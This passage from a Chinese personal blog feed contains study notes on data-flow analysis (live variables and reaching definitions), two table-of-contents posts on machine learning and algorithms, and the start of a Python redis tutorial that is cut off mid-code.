title="Abstraction"></a>Abstraction</h3><p>针对<code>Live Variables Analysis</code>，我们的关注点在于变量<code>v</code>的变化，它有两个状态<code>live</code> or <code>dead</code>，因此我们依然可以用<code>bit vector</code>的方式去对程序中出现的多个变量进行定义，假设程序有<code>V1,V2,...,Vn</code>，用1表示<code>live</code>，0表示<code>dead</code>，容易得到一组向量表示<code>00...00</code>(初始化的时候所有v都是<code>dead</code>)</p><h3 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3><p>前面我们已经确定了<code>backward</code>，也就是说在经过一个<code>BB</code>的时候，需要从<code>OUT[B]</code>结合<code>BB</code>中对v的使用情况，计算得到<code>IN[B]</code>，如此，我们需要考虑几种不同<code>BB</code>的情况（下面的v并非一个具体的变量，而是所有在<code>BB</code>中可能被使用的变量）：</p><ol><li><code>BB</code>中没用对<code>v</code>的使用，也没有对<code>v</code>重新定义（如<code>k=n</code>）：很显然<code>IN[B] = OUT[B]</code></li><li><code>BB</code>中存在对<code>v</code>的使用，但没有对<code>v</code>重新定义（如<code>k=v</code>）: 显然在<code>IN[B]</code>中要加上使用的部分，用$use_B$表示，即$IN[B] = OUT[B] \bigcup use_B$</li><li><code>BB</code>中不存在对<code>v</code>的使用，但有对<code>v</code>的重新定义（如<code>v=3</code>）：这意味着要从<code>OUT[B]</code>中去除被定义的部分，即$IN[B]=OUT[B]-def_B$</li><li><code>BB</code>中同时存在对<code>v</code>的定义和使用，这时候就要分开考虑定义在前还是在后：<ul><li>定义在前（<code>v=2 k=v</code>）：实际上这时候被使用的<code>v</code>已经是新定义的<code>v</code>了，因此和3一样处理</li><li>定义在后（<code>k=v,v=2</code>）：这时候被使用的<code>v</code>依然是原来的<code>v</code>，只不过用完之后被重新定义了（根据<code>Live Variables Analysis</code>的定义，<code>v should not be redefined before usage</code>），这意味着这种情况也是<code>live</code>的，同2处理</li></ul></li></ol><p>综上所述，我们可以得到<code>Transfer Function</code>:</p><script type="math/tex; mode=display">IN[B] = use_B \bigcup (OUT[B] - def_B)</script><blockquote><p>其中$use_B$是指那些use在<code>redefine</code>之前的的使用</p></blockquote><h3 id="Control-Flow"><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3><p>下面考虑如何处理数据流汇聚的情况，根据前面的<code>Live Variables Analysis</code>定义，只要存在一条执行路径，该变量被使用过即可，因此与<code>Reaching Definition Analysis</code>相同，<code>Live Variables Analysis</code>的<code>Control Flow</code>也是取$\bigcup$ ，只不过由于是<code>backward</code>，<code>OUTp[B]</code>变成求所有后继节点<code>IN[S]</code>的并集：</p><script type="math/tex; mode=display">OUT[B] = \bigcup_{S\ a\ successor\ of\ B}IN[S]</script><p>上面对<code>Transfer Function</code>和<code>Control Flow</code>的解释多用文字，因此配上一张老师提供的例图来加深理解：</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327154929.png" alt="image-20210327154929253"></p><blockquote><p>其中，假设<code>OUT[B] = &#123;v&#125;</code>（即在<code>OUT[B]</code>中v是<code>live</code>的），根据图中不同数字标注的情况，计算<code>IN[B]</code>中<code>v</code>的<code>live</code>,<code>dead</code>情况</p></blockquote><h2 id="Live-Variables-Analysis-算法设计"><a href="#Live-Variables-Analysis-算法设计" class="headerlink" title="Live Variables Analysis 算法设计"></a>Live Variables Analysis 算法设计</h2><p>有了之前<code>Reaching Definition Analysis</code>的算法设计思路，其实我们对<code>Live Variables Analysis</code>算法的设计应该变得很容易，主要关注变化的点：</p><ol><li>分析方向由<code>forward</code>转向<code>backward</code>，这意味着我们初始化的对象要从<code>entry</code>转向<code>exit</code>，<code>OUT</code>转向<code>IN</code></li><li>关注的变化对象要修改了，之前是关注<code>OUT</code>，因为最终计算结果在<code>OUT[B]</code>中体现，但现在要看<code>IN[B]</code>了</li></ol><p>综上，结合<code>Transfer Function</code>和<code>Control Flow</code>，可以得到算法如下：</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327160043.png" alt="image-20210327160043126"></p><blockquote><p>这里对算法不过多解释，详细可以参考上一篇对<code>Reaching Definition Analysis</code>的算法分析过程</p></blockquote><h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>同样地，理解了概念之后，需要经过一个实际的栗子来加深映像，与上文一样，这里受限于文章内容，只给出<strong>起始</strong>和<strong>结束</strong>的状态：</p><ul><li><strong>起始</strong>：假设某CFG如下</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327160354.png" alt="image-20210327160354443" style="zoom:50%;" /></p><blockquote><p>左上角是程序中出现的变量，0表示都还未被使用</p></blockquote><ul><li><strong>结束</strong></li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327160455.png" alt="image-20210327160455308"></p><div class="table-container"><table><thead><tr><th></th><th>B5</th><th>B4</th><th>B3</th><th>B2</th><th>B1</th></tr></thead><tbody><tr><td><strong>def</strong></td><td>z</td><td>x, q</td><td>x</td><td>m, y</td><td>x, y</td></tr><tr><td><strong>use(before  def)</strong></td><td>p</td><td>y</td><td>x</td><td>k</td><td>p, q, z</td></tr></tbody></table></div><blockquote><p>整个的计算思路和上一篇文章类似，只要沿着算法过程不断迭代就可以得到最终结果。对于<code>def</code> 和<code>use(before def)</code>的计算我特地按照<code>B5-&gt;B1</code>的顺序，是为了突出<code>backward</code>的思想。根据上面的表格结合算法，很容易计算得到每个<code>BB</code>的<code>IN[B],OUT[B]</code>。<strong>对于最终结果取如下栗子解释，<code>100 1001</code>表示<code>x,p,k</code>在此<code>program point</code>是<code>live</code>，其他都是<code>dead</code>，你不妨手动根据定义验证一下这个结论是否正确</strong></p></blockquote><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327162508.png" alt="image-20210327162508258" style="zoom:50%;" /></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文着重讲解了数据流分析中的<code>Live Variables Analysis</code>，包括其<strong>定义与理解，分析过程（算法），实际例子</strong>，实际上这部分内容和<code>Reaching Definition Analysis</code>基本上是异曲同工，只不过将分析的对象从定义转换到了变量，因此，在文中很多对方，我会拿两者进行对比，并进行一些跳跃，如果有看不懂的地方，建议去B站仔细看看老师的授课视频，相信会有更深的体会。</p><p>这堂课带给我比较打的一个思考就是<code>backward</code>和<code>forward</code>的选择，这一点有点像背包问题中的正向循环（01背包）和逆向循环（完全背包）。当某一条路前进计算困难时，不妨逆向思考，倒着走或许会有惊奇的发现（当然思考不是随缘，是基于对定义的深度理解和剖析得到的）</p><p>至此，已完成数据流分析中两部分的分析内容，下一部分是<code>Available Expresiions Analysis</code>，当写完三部分内容后，会对三者进行一个对比总结。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><sup><a href="#fn_1" id="reffn_1">1</a></sup> : <a href="https://www.bilibili.com/video/av97277892/?spm_id_from=333.788.b_765f64657363.3">南京大学《软件分析》课程04（Data Flow Analysis II）_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>static_analysis</tag>
      
      <tag>live_variable_analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【静态分析】数据流分析-Part I</title>
    <link href="/article/19520.html"/>
    <url>/article/19520.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这阵子在学习静态分析，找了许多学习材料，但讲的都晦涩难懂，无意间在神奇的<code>bilibili</code> 刷到了一位南京大学<code>Yue Li</code>老师的静态分析课程<sup><a href="#fn_1" id="reffn_1">1</a></sup>，不得不说，老师讲的太棒了，让我对静态分析的知识有了基本的了解，算是做了一个简单的入门。</p><p>本文，是静态分析中数据流分析的<code>Part I</code> ，主要讲解<code>Reaching Definition Analysis</code> ，主要内容包括：</p><ul><li><p>前置知识</p></li><li><p><code>Reaching Definition Analysis</code>的定义和理解</p></li><li><code>Reaching Definition Analysis</code>算法与详解</li><li>举个栗子</li><li>总结</li></ul><p>读完本文会对数据流分析<code>Reaching Definition Analysis</code> 内容有一个初步的了解，解答包括<strong>是什么，怎么做，效果体现</strong>三方面的问题，废话不多说，<code>Let&#39;s start!</code></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在进行<code>Reaching Definition Analysis</code> 之前，先需要对一些基础术语和定义有基本的了解：</p><ul><li><code>CFG, Control Flow Graph</code> (控制流图)：这个概念在静态分析中经常被提及，也十分地重要，它定义了程序执行的过程和走向，如果把数据流比作水流，控制流图就是一系列组合的管道，它控制了水能够经过的地方，这个内容我会单独在后面单独写一篇文章讲解，这里先按下不表。</li><li><code>BB, Basic Block</code>(基本程序块)：是<code>CFG</code> 的重要组成部分，可以看作各个结点，由一条或多条基本指令组成，这个内容同样在<code>CFG</code>的文章中讲解</li><li><code>Input and Output States</code>(输入输出状态)：我们知道，指令<code>s</code>执行过后，程序的状态就发生了改变（例如某个变量被赋值），为了描述改变前后的状态，我们用符号<code>IN[s],OUT[s]</code>表示，前者也表示指令的状态输入，后者也表示指令的状态输出，如下图所示：</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210325210029.png" alt="Input Output States"></p><blockquote><p>注意到图中还有一个<code>program point</code> ，这和<code>IN[s],OUT[s]</code>是相关联的，表示为程序执行到的点，很显然假设<code>s2</code> 是<code>s1</code>的后继，必然有<code>IN[s2]=OUT[s1]</code>，图中还列举了另外两种分散和聚合的情况，分散的情况中<code>IN[s2]=IN[s3]=OUT[s1]</code>，聚合的情况中，<code>IN[s2]</code>就和<code>OUT[s1],OUT[s3]</code>两者有关了，但具体是什么关系要根据具体的分析情况，这里用一个<code>^(meet)</code>符号表示，它可以是∩(交集)，也可以是∪（并集），甚至是其他的一些联合操作。</p></blockquote><ul><li><p>基于<code>BB</code>的<code>States</code>： 在静态分析的过程中，我们都是以<code>BB</code>为单位进行分析的，因此我们需要对<code>IN[B],OUT[B]</code>做出定义，回顾<code>BB</code>是由多条指令<code>s</code>组成的，因此我们很容易有如下的定义：</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210325211432.png" alt="image-20210325211432294"></p></li></ul><blockquote><p>这个图对<code>IN[B]、OUT[B]</code>诠释地很全面了，这里简单说明一下，<code>IN[s[i+1]]=OUT[s[i]]</code>（因为它们是顺序执行关系）,<code>IN[B]=IN[s1]</code>（整个<code>BB</code>的状态输入来源于第一条指令的输入）,<code>OUT[B]=OUT[s[n]]</code>（整个<code>BB</code>的状态输出最终通过<code>s[n]</code>体现）</p></blockquote><ul><li><code>BBs</code> 状态转换：在我们定义了<code>IN[B],OUT[B]</code>之后，对于不同控制流中块到块之间，<code>IN[B],OUT[B]</code>会如何变化？这里又有两个概念：<strong>Transfer Function, Control Flow</strong>（转移函数，控制流），<strong>Transfer Function</strong>是针对块而言的，对于<code>BB</code> 中指令的操作，我们可以封装理解为一个函数式（该函数有输入<code>IN[B]</code>，输出<code>OUT[B]</code>），那么从<code>IN[B]</code>转移到<code>OUT[B]</code>，我们就可以定义为</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210325213322.png" alt="image-20210325213322647"></p><blockquote><p>其中$f_B$表示经过<code>BB</code>的<code>Transfer Function</code>，后面是函数嵌套，而从<code>OUT[P]</code>怎么转换到<code>IN[B]</code>呢？实际上就是和我们之间定义的聚合情况中指令类似，只要将每个<code>BB</code>的<code>OUT</code> 做<code>^</code>(meet)操作即可（注意meet不一定是交集），而这里为什么还有<code>P a predecessor of B</code> (P是B的一个前驱)？这是因为分析的过程包含<code>forward</code>和<code>backward</code>两种方式，在本文中采用了<code>forward</code> 的分析方法，在后面会讲到<code>backward</code>的方式。</p></blockquote><p>最终有如下图示：</p><p>  <img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210325214236.png" alt="image-20210325214236514"></p><p>到此，我们把必要的前置知识说明完毕，这部分如果不理解建议去看一下b站的视频，老师讲的十分详细。</p><h2 id="Reaching-Definition-Analysis"><a href="#Reaching-Definition-Analysis" class="headerlink" title="Reaching Definition Analysis"></a>Reaching Definition Analysis</h2><p>光从名字就知道这是一个针对定义的分析，但<code>Reaching</code>又是什么意思呢？这里又要设计到一些定义：</p><ul><li><code>definition</code> ：说直白点就是变量的赋值语句，例如<code>v=3,v=k</code></li><li><code>reaching</code> ：先官方解释一下，变量<code>v</code> 从<code>program point</code> <code>p</code> <strong>reaching</strong><code>program point q</code>的前提是存在一条从p到q的路径且在该路径中<code>v</code>没有被重新定义，图示如下：</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326190556.png" alt="image-20210326190555912"></p><blockquote><p>换成人话就是两程序执行点之间没有新的关于<code>v</code>的赋值语句，这个也就表示了最开始<code>v</code>的定义到了<code>q</code>依然是有效的，例如:</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">v &#x3D; 3v &#x3D; 5  # 本语句重新定义了v，使得v&#x3D;3失效k &#x3D; v  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></blockquote><p>下面就到了另一个问题，为什么要做<code>reaching definition analysis</code>，一个直观的作用就是用于检测<code>undefined variables</code>，在程序中所有出现的变量都有一个初始状态，即<code>undefined</code>，假设在某一条路径上变量<code>v</code>被使用了<code>k = v</code>，但此时<code>v</code>的状态依然是<code>undefined</code>,就发生了使用未定义变量的错误。</p><p>知道了<code>reaching definition anlysis</code>的定义和目的后，就要设计分析的过程了，这个设计过程是静态分析过程中非常经典的，后面另外的两种分析方式也采用一样的设计模式，具体来说包括三步：</p><ol><li><code>Abstraction</code> ：对要分析的对象进行抽象，这有利于我们后面的表示</li><li><code>Transfer Function</code>：定义经过程序执行过后的状态变化</li><li><code>Control Flow</code>: 定义不同程序块汇聚时候的策略，为什么单独针对<strong>汇聚</strong>的情况？是因为在汇聚的时候输出的结果有不同的组合方式进入输入，这个要根据实际分析而定</li></ol><h3 id="Abstraction"><a href="#Abstraction" class="headerlink" title="Abstraction"></a>Abstraction</h3><p>在本文的分析中，我们关注的对象是<code>definition</code>，更一般地，是<code>definition</code>是否可<code>reach</code>，考虑到程序中可能有非常多的<code>definition</code>（因为有很多变量的赋值语句），我们采用一种<code>bit vector</code>的方式进行定义，假设程序有<code>D1,D2,...,Dn</code>定义，用1表示<code>reach</code>，0表示不可<code>reach</code>，那么容易得到一组向量<code>00000..00</code>(初始化的时候都不可<code>reach</code>)</p><h3 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3><p>转移函数取决于程序中执行的指令，在设计<code>Transfer Function</code>的时候就要结合定义思考：<strong>pq之间不能有新的对于v的定义</strong></p><ol><li>pq之间不存在对于v的赋值语句，此时输入与输出一致没变化</li><li>pq之间存在v的赋值语句(<code>v=3</code>)，这时候有两个操作：<ul><li>因为有新的赋值语句，所以该处定义被激活</li><li>因为该处定义被激活，导致其他所有与该定义的v相关的语句失效</li></ul></li></ol><p>上面的说法可能比较抽象，看个图就明白了：</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326194634.png" alt="image-20210326194634046" style="zoom:50%;" /></p><blockquote><p>上图中针对不同的<code>BB</code>，定义了两种集合,$gen_B,kill_B$，前者表示，经过该<code>BB</code>，对应被激活的<code>definition</code>集合，后者表示，经过该<code>BB</code>，对应失效的<code>definition</code>集合，例如在<code>B1</code>执行后，涉及的被定义变量有<code>i,j,a</code>，那么这三句定义生效，所有其他对<code>i,j,a</code>进行定义的<code>definition</code>失效，即$d_4,d_5,d_6,d_7$</p></blockquote><p>考虑到还有输入的状态（因为输入包含之前被激活的情况），所以得到如下的<code>Transfer Function</code>：</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326195147.png" alt="image-20210326195147092"></p><blockquote><p>从输入中去除那些失效的，加上新被激活的就得到了输出</p></blockquote><h3 id="Control-Flow"><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3><p>设想一下，假设如图下的情况，在<code>P1</code>中包含对v的定义，<code>P2</code>中没有，那么<code>B</code>中<code>v</code>的定义是否可达？</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326195400.png" alt="image-20210326195400882"></p><p>反过来想，如果我们认为在<code>B</code>中<code>v</code>的定义不可达（也就是没有定义），当程序执行的路径经过<code>P1</code>时，v出现了定义，而到下一个<code>BB</code>，v又没有定义了，这显然是不成立的。</p><p>换言之，只要<code>B</code>的前驱程序块中有一个块对<code>v</code>的定义是可达的，那么在<code>B</code>中就是可达的。</p><h2 id="Reaching-Definition-Analysis-算法设计"><a href="#Reaching-Definition-Analysis-算法设计" class="headerlink" title="Reaching Definition Analysis 算法设计"></a>Reaching Definition Analysis 算法设计</h2><p>做好了一系列前置准备工作后，我们就需要定义分析的流程，这里先不着急直接看算法，先思考几个点：</p><ol><li>最开始的时候所有变量都没有定义</li><li>当程序块执行过后，某些变量会被定义，即某些<code>definition</code>会被激活，同时某些也会失效</li><li>在汇聚（merge）的时候后继的输入与前驱的输出有关，而某些情况下，后面的<code>BB</code>由于状态更新后产生了变化，同时该块又是前面已执行块的前驱（常见于goto），这时候我们就又要对前面的块结果进行更新，因此算法必然是多次循环遍历程序块的</li><li>循环遍历的终点应该在于所有块的状态都不发生变化了，因此我们需要监测块的前后状态情况</li></ol><p>基于以上思考，得到如下算法：</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326202252.png" alt="image-20210326202252744"></p><ul><li><strong>输入</strong>：CFG、<code>gen</code>和<code>kill</code>的集合，因为一旦程序块确定了，那么每个块的<code>gen</code>和<code>kill</code>是个定值</li><li><strong>输出</strong>：<code>IN[B],OUT[B]</code>，这里输出的状态实际上就是前面对<code>definition</code>的抽象表示，例如有<code>D1,D2,D3</code>，那么状态表示就是<code>000</code>，当<code>D1</code>被激活，则状态转变为<code>100</code></li><li><strong>方法</strong>：<ol><li>第一步初始化所有$OUT[entry]=\phi$ ，即代表一开始所有定义都是<code>undefined</code></li><li>第二步针对所有<code>BB</code>，讲输出设为$\phi$ ，这也很显然，唯一要说明的是两者都是要置空，为什么要分开来，这个其实是为了划分边界，因为有的算法与之类似，但边界的初始化和其他基本块不同，这里划分开，就让两种算法在结构上保持了一致</li><li>第三步是循环，终止条件是所有输出块没有发生变化，同时对所有的<code>BB</code>，按照之前定义的<code>Transfer Function, Control Flow</code>实现更新</li></ol></li></ul><p>有一点值得思考的在于算法能否终止，其中最核心的地方就是<code>IN[B],OUT[B]</code>，<code>IN[B]</code>取决于所有的<code>OUT[P]</code>，而<code>OUT[B]</code>又取决于<code>IN[B]</code>(<code>gen</code>,<code>kill</code>是固定值)，也就是说一旦<code>IN,OUT</code>有一个不变，另一个就不会再变化，所以我们只需要看一个块就好，对于一个<code>BB</code>,由于<code>kill</code>是固定的，相当于经过这个块被<code>kill</code>的状态恒为0，而<code>kill</code>是唯一使得1-&gt;0的变化，所以说一个块的状态只能从<code>0-&gt;1,1-&gt;1</code>，经过若干次变化后，必然会停止（最坏情况都是1），也即<code>BB</code>最终趋于不变，这时候循环就结束了。</p><h2 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h2><p>说了那么多，不如实际跟着一个例子走一遍，由于视频中采用动图，如果将每一张一一展开叙述，实在太费笔墨，这里直接以起始和结束两图为例：</p><ul><li><strong>起始</strong>：假设某<code>CFG</code>如下：</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326204625.png" alt="image-20210326204625309" style="zoom:50%;" /></p><blockquote><p>左边为框架对应的程序源码（缩略版），其中不同颜色标注的定义代表了不同变量</p></blockquote><ul><li><p><strong>结束</strong>：</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210326204800.png" alt="image-20210326204800573"></p></li></ul><div class="table-container"><table><thead><tr><th></th><th>B1</th><th>B2</th><th>B3</th><th>B4</th><th>B5</th></tr></thead><tbody><tr><td><strong>gen</strong></td><td>D1,D2</td><td>D3,D4</td><td>D7</td><td>D5,D6</td><td>D8</td></tr><tr><td><strong>kill</strong></td><td>D5,D7,D4</td><td>D2</td><td>D1,D5</td><td>D1,D7,D8</td><td>D6</td></tr></tbody></table></div><blockquote><p>简单对图中运行过程进行说明：左上角是状态的定义（一共有8个<code>definition</code>）和所用的迭代次数，不同颜色代表了不同的迭代轮次，例如黑色就表示初始化，所有状态都是<code>0000 0000</code>，然后是红色（为第一次迭代后状态的变化结果），这部分只要结合算法一步步过下来即可。建议自己在纸上运算一遍，再和结果对照。上面我还给出了每个<code>BB</code>的<code>gen</code>和<code>kill</code>，通过查表可以加速计算的过程。</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文着重讲解了数据流分析中的<code>Reaching Definition Analysis</code>，包括其<strong>定义与理解，分析过程（算法），实际例子</strong>，对一些基础的概念也进行了详细的阐述，但还是有许多没能讲解透彻的地方，如果真的对这块内容有兴趣的话，建议去B站看一遍老师的视频，会有不同的感悟和理解。这堂课带给我最大的启发，主要有几点：</p><ol><li>专业性的知识：数据流分析要分析什么，为什么分析，如何分析</li><li>如何将一个分析问题具象到对定义和分析过程的设计：像本文就是为了知道在程序执行过后，每个定义语句的有效性，以便找出<code>undefined variables</code>,要达到这个目的，要知道程序块执行后对定义产生了什么影响，以及数据流汇聚时候的处理</li><li>设计分析过程（算法）的巧妙之处，包括特殊的边界处理和对算法终止的判断</li></ol><p>其他更多的内容待以后有新的感悟之后再添加进来。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><sup><a href="#fn_1" id="reffn_1">1</a></sup> :  <a href="https://www.bilibili.com/video/av95400721/?spm_id_from=333.788.b_765f64657363.2">南京大学《软件分析》课程03（Data Flow Analysis I）_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>static_analysis</tag>
      
      <tag>reaching_definition_analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【机器学习】专栏目录</title>
    <link href="/article/14948.html"/>
    <url>/article/14948.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记载了我在学习machine-learning(机器学习)过程的感悟和思考文章的所有标题和链接（包括之前在CSDN创作的机器学习文章）可通过该目录找到系列对应文章，后续该方面的内容依然会更新到本目录。</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><ul><li><p><a href="https://blog.csdn.net/GentleCP/article/details/101626181">机器学习：基础知识（线性分类问题）</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/104657019">机器学习：矩阵、向量求导理解</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/104951049">【机器学习基础】误差分析</a></p></li></ul><h2 id="经典机器学习算法"><a href="#经典机器学习算法" class="headerlink" title="经典机器学习算法"></a>经典机器学习算法</h2><ul><li><p><a href="https://blog.csdn.net/GentleCP/article/details/99061426">决策树：ID3&amp;C4.5&amp;cart算法（从原理到实现-小白教程超详细）</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/103791208">机器学习：线性(Fisher)判别分析</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/102614817">隐马尔可夫模型简单理解</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/108035696">【机器学习】逻辑回归(LogisticRegression)原理与实战</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/108081657">【机器学习】决策树实战与分析</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/108108808">【机器学习】支持向量机(SVM)原理与实战</a></p></li></ul><h2 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h2><ul><li><a href="https://blog.csdn.net/GentleCP/article/details/104984351">【深度学习基础】简单易懂理解BP算法</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>machine-learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>machine-learning</tag>
      
      <tag>toc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【算法设计与分析】专栏目录</title>
    <link href="/article/21022.html"/>
    <url>/article/21022.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记载了我在学习DSAA(数据结构与算法)过程的感悟和思考文章的所有标题和链接（包括之前在CSDN创作的算法与设计专栏文章）可通过该目录找到算法设计与分析系列对应文章，后续该方面的内容依然会更新到本目录</p><blockquote><p>2020/04/22：<a href="https://blog.csdn.net/GentleCP/article/details/105679148">算法设计与分析：关于后续内容的一些说明</a></p></blockquote><h2 id="分治思想"><a href="#分治思想" class="headerlink" title="分治思想"></a>分治思想</h2><ul><li><p><a href="https://blog.csdn.net/GentleCP/article/details/101108413">算法设计与分析：分治思想 - 入门</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/101108695">算法设计与分析：深入理解快速排序</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/101512092">算法设计与分析：分治思想（2）- 选择问题（对单个数组归约）</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/102212046">算法设计与分析：分治思想（3）- 平面最近点对寻找问题（对点集归约）</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/102246489">算法设计与分析：分治思想（4）- 快速傅立叶变换（对数组的归约）</a></p></li></ul><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><ul><li><a href="https://blog.csdn.net/GentleCP/article/details/102504277">算法设计与分析：动态规划 - 矩阵链式相乘问题</a></li><li><a href="https://blog.csdn.net/GentleCP/article/details/102779619">算法设计与分析：动态规划（2） - 序列联配问题(最优对齐方案)</a></li><li><a href="https://blog.csdn.net/GentleCP/article/details/102814327">算法设计与分析：动态规划（3）-序列联配问题（以算代存）</a></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/102894420">算法设计与分析：动态规划（4）- 序列联配问题（观察回溯路径）</a></p></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/109443407">【算法设计与分析】动态规划 - 背包问题详解（基础背包）</a></p><h2 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h2></li><li><p><a href="https://blog.csdn.net/GentleCP/article/details/103095884">算法设计与分析：贪心算法 - 排课问题（DP与贪心的区别与应用）</a></p></li><li><a href="https://blog.csdn.net/GentleCP/article/details/103099264">算法设计与分析：贪心算法（2）- 最短路问题（DP到贪心的优化）</a></li><li><a href="https://blog.csdn.net/GentleCP/article/details/103196262">算法设计与分析：Dijkstra算法（从实现到优化）</a>   </li></ul><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><ul><li><a href="https://blog.csdn.net/GentleCP/article/details/106072413">算法设计与分析：二叉树问题的解决思路</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>DSAA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>toc</tag>
      
      <tag>DSAA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【redis】python操作与频道发布与订阅</title>
    <link href="/article/37287.html"/>
    <url>/article/37287.html</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文讲述如何用<code>python</code>连接使用<code>redis</code>和利用<code>redis</code>进行频道的订阅和消息发布，默认读者对于<code>redis</code>的基本概念和如何创建<code>redis</code>服务已经知晓。</p><h2 id="python操作redis"><a href="#python操作redis" class="headerlink" title="python操作redis"></a>python操作redis</h2><p>python操作redis主要包含几步：</p><ul><li>连接redis数据库</li><li><p>数据的增删查改</p><h3 id="连接redis数据库"><a href="#连接redis数据库" class="headerlink" title="连接redis数据库"></a>连接redis数据库</h3></li><li><p>直接连接<br>  <code>redis</code>提供了<code>Redis</code>和<code>StrictRedis</code>两种直连<code>redis</code>的方式，前者是为了兼容2.x版本，一般我们都用<code>StrictRedis</code></p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redisredis_conn <span class="token operator">=</span> redis<span class="token punctuation">.</span>StrictRedis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>  <span class="token comment"># 上述参数都是默认值，根据需要修改</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></li><li><code>ConnectionPool</code>连接<br>  实际上每一个<code>StrictRedis</code>直连都会创建一个<code>ConnectionPool</code>，并且在连接断开时销毁，我们可以将这部分内容手动创建，连接池会预先创建多个连接，当进行redis操作时，直接获取已经创建好的连接进行操作。完成后，不会释放这个连接，而是让其返回连接池，用于后续redis操作，这样在高并发的连接中就能提高性能。  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redisconn_pool <span class="token operator">=</span> redis<span class="token punctuation">.</span>ConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>password<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>redis_conn <span class="token 